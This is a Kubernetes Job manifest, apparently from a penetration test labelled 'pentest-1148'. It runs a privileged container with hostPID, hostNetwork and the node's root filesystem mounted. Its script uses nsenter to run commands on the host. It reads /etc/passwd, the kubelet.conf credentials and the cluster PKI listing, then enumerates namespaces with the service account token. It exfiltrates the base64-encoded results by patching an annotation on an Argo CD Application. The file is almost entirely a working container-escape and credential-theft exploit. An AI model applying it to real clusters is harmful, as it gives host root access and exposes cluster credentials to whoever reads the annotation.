apiVersion: batch/v1
kind: Job
metadata:
  name: hostexec
  namespace: pentest-1148
  labels:
    purpose: pentest-1148
spec:
  backoffLimit: 0
  ttlSecondsAfterFinished: 86400
  template:
    metadata:
      labels:
        purpose: pentest-1148
    spec:
      serviceAccountName: probe
      restartPolicy: Never
      hostNetwork: true
      hostPID: true
      containers:
      - name: c
        image: busybox:1.36
        securityContext:
          privileged: true
        volumeMounts:
        - name: hostroot
          mountPath: /host
        command: ["/bin/sh","-c"]
        args:
        - |
          API="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"
          CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
          TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
          OUT=/tmp/out.txt
          {
            echo "## nsenter-host-exec"
            nsenter -t 1 -m -u -i -n -p -- /bin/sh -c 'id; hostname; cat /etc/hostname; printf p1148-proof > /tmp/p1148_probe; ls -la /tmp/p1148_probe; head -3 /etc/passwd; ps -ef | head -8' 2>&1
            echo "## kubelet-conf"
            cat /host/etc/kubernetes/kubelet.conf 2>&1 | head -60
            echo "## host-kubernetes-pki"
            ls -la /host/etc/kubernetes/pki 2>&1 | head -40
            echo "## namespaces"
            curl -s --cacert $CA -H "Authorization: Bearer $TOKEN" "$API/api/v1/namespaces" 2>&1 | tr ',' '\n' | grep '"name"' | head -90
          } > $OUT 2>&1
          B64=$(base64 $OUT | tr -d '\n')
          PATCH="{\"metadata\":{\"annotations\":{\"pentest1148.hostexec\":\"$B64\"}}}"
          curl -s --cacert $CA -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/merge-patch+json" -X PATCH "$API/apis/argoproj.io/v1alpha1/namespaces/argocd/applications/p1148" -d "$PATCH" >/dev/null
          echo DONE
      volumes:
      - name: hostroot
        hostPath:
          path: /
